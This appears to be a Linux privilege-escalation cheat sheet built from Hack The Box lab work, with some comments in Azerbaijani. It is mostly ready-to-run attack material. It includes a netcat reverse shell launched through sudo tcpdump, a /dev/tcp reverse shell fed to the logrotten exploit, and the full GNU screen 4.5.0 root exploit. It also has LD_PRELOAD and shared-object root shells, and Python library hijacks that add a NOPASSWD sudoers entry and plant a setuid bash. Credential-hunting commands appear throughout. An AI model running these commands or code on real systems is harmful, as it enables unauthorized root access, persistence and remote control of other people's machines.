# List Process
```powershell
ps aux | grep root
ps au

# Proc
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

# Services
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i";fi; done

# Sudo Version
sudo -V

# Hosts
cat /etc/hosts

# User's Last Login
lastlog

# Logged In Users
W

# Trace System Calls
strace ping -c1 10.129.112.20

# Script
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

# SSH Directory
ls -l ~/.ssh

# Bash History
history
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null

# Sudo - List User's Privileges
sudo -l

# Critical Files
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

# Credential Hunting
grep 'DB_USER\|DB_PASSWORD' wp-config.php
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
ls ~/.ssh

# Shadow / Passwd
ls -l /etc/shadow   -rw-r----- 1 root shadow 1643 Apr  6 18:20 /etc/shadow  ( Read or Write == CRITICAL )
ls -l /etc/passwd   -rw-r----- 1 root shadow 1643 Apr  6 18:20 /etc/shadow  ( Read HASH or Write == CRITICAL )


# Cron Jobs
ls -la /etc/cron.*


# File Systems & Additional Drives
lsblk


# Find Writable Directories
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null


# Find Writable Files
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null


# Search Pattern Credentials
grep -rn "Password" / 2>/dev/null
```

# Path Abuse
```powershell
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

PATH=.:${PATH}
export PATH
echo $PATH

touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
```

# Wildcard Abuse
```powershell

```

# Restricted Shell
```powershell
echo $SHELL
echo $0
echo $PATH

echo /home/htb-user/bin/*
ls | /bin/bash
ls ; /bin/bash

Method 1:
vim
:set shell=/bin/bash
:shell

ssh htb-user@10.129.16.44 -t "bash --noprofile"
```

# Special Permissions
```powershell
find / -user root -perm -2000 -writable 2>/dev/null    SGID
find / -user root -perm -4000  2>/dev/null          SUID
find / -user root -perm -6000  2>/dev/null          SUID + SGID

find / -perm -4000 -type f 2>/dev/null | awk -F'/' '{print $NF}' | sort -u > suid_binaries.list
for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do 
    if grep -q "^$i$" suid_binaries.list; then 
        echo "[!!!] Dangerous SUID Binary -> This Method has in GTFOBin: $i";
    fi; 
done

find / -perm -6000 -type f 2>/dev/null | awk -F'/' '{print $NF}' | sort -u > critical_binaries.list
for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do 
    if grep -q "^$i$" critical_binaries.list; then 
        echo "[!!!] Dangerous SGID Binary -> This Method has in GTFOBin: $i";
    fi; 
done

bash.sh
#!/bin/bash
id
```

# Sudo Rights Abuse
```powershell
sudo -l

(root) NOPASSWD: /usr/sbin/tcpdump

sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

cat /tmp/.test
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f

sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

nc -lnvp 443
```

# Privileged Groups
```powershell
Privileged Groups:
root
sudo
wheel
docker
lxd
shadow
disk
kmem
mem
port
adm
systemd-journal
tty
audio/video

grep -v -E '^#' /etc/group | grep -E ':.*(root|sudo|docker|lxd|disk|shadow)'
id
groups

cat /etc/group | grep istifadəçi_adı
getent group | grep istifadəçi_adı
```

# Capabilities
```powershell
getcap -r / 2>/dev/null | grep --color=always -E 'cap_sys_admin|cap_setuid|cap_setgid|cap_dac_override|cap_sys_ptrace|cap_sys_module|cap_sys_chroot|$'

find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

cap_setuid+ep | cap_setgid+ep
/yol/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

cap_dac_override+ep
/yol/tapılan_fayl cat ~/.ssh/id_rsa.pub > /root/.ssh/authorized_keys
ssh root@localhost

cap_sys_admin+ep
mkdir /tmp/rootfs
/yol/tapılan_fayl mount /dev/sda1 /tmp/rootfs
cd /tmp/rootfs/etc/
```

# Vulnerable Services
```powershell
screen -v

./screen_exploit.sh 

#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

# Logrotate
```powershell
logrotate --help

find /var/log -type f -writable 2>/dev/null

cat /etc/logrotate.conf
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

sudo cat /var/lib/logrotate.status

ls /etc/logrotate.d/

git clone https://github.com/whotwagner/logrotten
cd logrotten
gcc logrotten.c -o logrotten

echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload

./logrotten -p ./payload /var/log/some_log_file
```

# Miscellaneous Techniques
```powershell
python3 pcredz.py -i eth0
```

# Weak NFS Permissions
```powershell
python3 nfscaner.py 192.168.1.0/24 ( Personal Tool )

showmount -e 10.129.2.12

no_root_squash --> DANGEROUS

cat /etc/exports

shell.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(void)
{setuid(0); setgid(0); system("/bin/bash");}

gcc -static shell.c -o shell

mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell

./shell
```

# Kernel Exploit
```powershell
linux-exploit-suggester.sh
```

# Shared Libraries
```powershell
sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart

root.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles

sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

# Shared Object Hijacking
```powershell
ls -la /path/to/suid_binary
ldd /path/to/suid_binary

./linpeas.sh | grep -A5 "Shared Library"

readelf -d payroll  | grep PATH

ldd payroll
  linux-vdso.so.1 (0x00007ffd22bbc000)
  libshared.so => /development/libshared.so (0x00007f0c13112000)
  /lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)

cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

src.c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}

gcc src.c -fPIC -shared -o /development/libshared.so

./payroll 
```

# Python Library Hijacking
```powershell
Vector 1
sudo -l

find / -perm -4000 -name "*.py" 2>/dev/null
find / -perm -2000 -name "*.py" 2>/dev/null

cat script.py | grep "import"

grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

cat /usr/local/lib/python3.8/dist-packages/psutil/__init__.py | grep -A 20 "def virtual_memory"
nano /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

```
### Add module
```powershell
def virtual_memory():
    #### HİJACK BAŞLAYIR ####
    import os
    os.system('id')                          # Test üçün
    # os.system('bash -i >& /dev/tcp/10.10.14.X/4444 0>&1')  # Reverse shell
    #### HİJACK BİTİR ####
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    _TOTAL_PHYMEM = ret.total
    return ret

sudo /usr/bin/python3 ./mem_status.py
```
```powershell
VECTOR: Library Path (PYTHONPATH Sırası)

python3 -c 'import sys; print("\n".join(sys.path))'
# /usr/lib/python38.zip        ← 1-ci axtarılır
# /usr/lib/python3.8           ← 2-ci axtarılır

pip3 show psutil
/usr/local/lib/python3.8/dist-packages  ← Aşağı prioritet

ls -la /usr/lib/python3.8
ls -la /usr/lib/python38.zip 2>/dev/null

python3 -c 'import sys; print("\n".join(sys.path))' | while read path; do
    echo -n "$path : "
    ls -ld "$path" 2>/dev/null | awk '{print $1, $3, $4}'
done

nano /usr/lib/python3.8/psutil.py

#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
    # Real bir hücumda:
    os.system('cp /bin/bash /tmp/bash && chmod +s /tmp/bash')
    os.system('echo "htb-student ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers')

sudo /usr/bin/python3 mem_status.py
```
```powershell
VECTOR: PYTHONPATH Mühit Dəyişəni

sudo -l

# Axtardığımız şey:
# (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
#              ↑
#         Bu flag kritikdir! Mühit dəyişəni təyin etməyə icazə verir

sudo -l | grep SETENV

# /tmp qovluğunda saxta modul yarat (hər kəs yaza bilər)
nano /tmp/psutil.py

#!/usr/bin/env python3
import os
def virtual_memory():
    os.system('id')
    os.system('whoami')

# PYTHONPATH-ı /tmp olaraq təyin edib skripti işlət
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

# Python /tmp-də psutil.py tapır və onu import edir!
# uid=0(root) gid=0(root) groups=0(root)
```
